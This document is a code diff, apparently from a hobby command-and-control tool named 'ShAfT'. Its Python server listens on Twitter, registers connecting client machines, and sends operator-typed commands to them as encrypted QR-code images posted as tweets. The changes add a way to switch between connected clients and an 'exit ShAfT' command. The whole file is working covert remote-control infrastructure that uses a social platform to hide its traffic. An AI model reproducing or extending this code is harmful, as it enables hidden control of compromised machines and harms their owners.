@@ -12,9 +12,8 @@ import json
 import subprocess
 import requests
 from io import BytesIO
-# from api_keys_server import api_keys
 from api_keys import api_keys
-
+import sys
 from sqlalchemy import orm
 from sqlalchemy.ext.declarative import declarative_base
 import sqlalchemy as sa
@@ -80,8 +79,9 @@ class ServerListener(tweepy.StreamListener):
             self.sess.add(Client(client_id = client_id, init_wrkdir=self._get_response_message(tweet)))
             self.sess.commit()
             print(fg('green')+'New client connected!', client_id + fg('red'))
-            connect_to_new = input(fg('yellow')+'Connect to new client? ' + client_id + '(Y/N)' + fg('red'))
+            connect_to_new = input(fg('yellow')+'Connect to new client? ' + client_id + '(Y/N)')
             if connect_to_new in ['y','Y']:
+                print(fg('red'))
                 self.current_client = client_id
                 self.command_to_send = input(self._get_response_message(tweet))
                 # send command and wait for response
@@ -116,7 +116,24 @@ class ServerListener(tweepy.StreamListener):
         if tweet.split('::::'):
             return tweet.split('::::')[1]
         return 'empty'
-
+    
+    def _connect_different(self):
+        choice = input(reset + 'Would you like to connect to someone else or quit? (connect/quit)')
+        if choice in ['connect', 'c', 'con']:
+            possible_clients = session.query(Client).all()
+            if possible_clients:
+                print('Available clients: ', fg('yellow'))
+                for client in possible_clients:
+                    print(client)
+                wanted_client = input('Please select a client to connect to: ')
+                print(f'Connecting to {wanted_client}...')
+                self.current_client = wanted_client
+                self.command_to_send = input(self.sess.query(Client).filter(Client.client_id == self.current_client).all()[0].init_wrkdir)
+                self.post_command(f'{self.current_client}::::{self.command_to_send}::::command')
+            else:
+                print(f"{fg('yellow')} No clients found, listening...")
+        else:
+            sys.exit(reset+"Goodbye!")
 #-------------------------------------------------------Public subs-------------------------------------------------------#
     def generate_qr(self, message):
         # encode to base_64 and generate_qr
@@ -131,12 +148,15 @@ class ServerListener(tweepy.StreamListener):
         return self.cipher.decrypt(message)
 
     def post_command(self, message):
-        qr = self.generate_qr(message)
-        qr.save('command_to_send.jpg')
-        # post to twitter
-        self.api.update_with_media('command_to_send.jpg')
-        os.remove('command_to_send.jpg')
-        return True
+        if self.command_to_send == 'exit ShAfT':
+            self._connect_different()
+        else:
+            qr = self.generate_qr(message)
+            qr.save('command_to_send.jpg')
+            # post to twitter
+            self.api.update_with_media('command_to_send.jpg')
+            os.remove('command_to_send.jpg')
+            return True
 
     def read_message(self, tweet_data):
         if 'media' in tweet_data['entities']:
